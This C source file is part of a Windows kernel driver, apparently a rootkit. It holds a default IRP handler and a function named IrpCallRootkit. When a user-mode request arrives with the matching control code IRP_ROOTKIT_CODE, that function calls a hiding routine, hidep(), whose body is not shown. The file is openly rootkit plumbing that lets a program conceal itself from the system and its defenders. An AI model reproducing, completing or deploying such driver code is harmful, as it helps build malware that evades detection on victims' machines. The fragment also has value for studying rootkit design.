#include "Driver.h"


NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION  irpSp;

	ULONG inBufferLength, outBufferLength, requestCode;

	irpSp = IoGetCurrentIrpStackLocation(Irp);

	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
	PCHAR buffer = NULL;

	Irp->IoStatus.Status = requestCode == IRP_ROOTKIT_CODE ? hidep() : STATUS_INVALID_DEVICE_REQUEST;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Irp->IoStatus.Status;
}